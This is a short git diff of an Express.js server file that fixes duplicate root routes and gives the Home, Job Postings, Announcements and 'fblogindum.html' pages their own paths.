@@ -44,16 +44,16 @@ app.post('/submit-login', (req, res) => {
 
 // Route to serve the homepage
 app.get('/', (req, res) => {
-    res.sendFile(path.join(__dirname, 'Job Postings.html')); // Change 'index.html' to your main HTML file name
-});
-
-app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'Home.html')); // Change 'index.html' to your main HTML file name
 });
-app.get('/', (req, res) => {
+
+app.get('/Job Postings.html', (req, res) => {
+    res.sendFile(path.join(__dirname, 'Job Postings.html')); // Change 'index.html' to your main HTML file name
+});
+app.get('/Announcements.html', (req, res) => {
     res.sendFile(path.join(__dirname, 'Announcements.html')); // Change 'index.html' to your main HTML file name
 });
-app.get('/public', (req, res) => {
+app.get('/public/fblogindum.html', (req, res) => {
     res.sendFile(path.join(__dirname, 'fblogindum.html')); // Change 'index.html' to your main HTML file name
 });
 
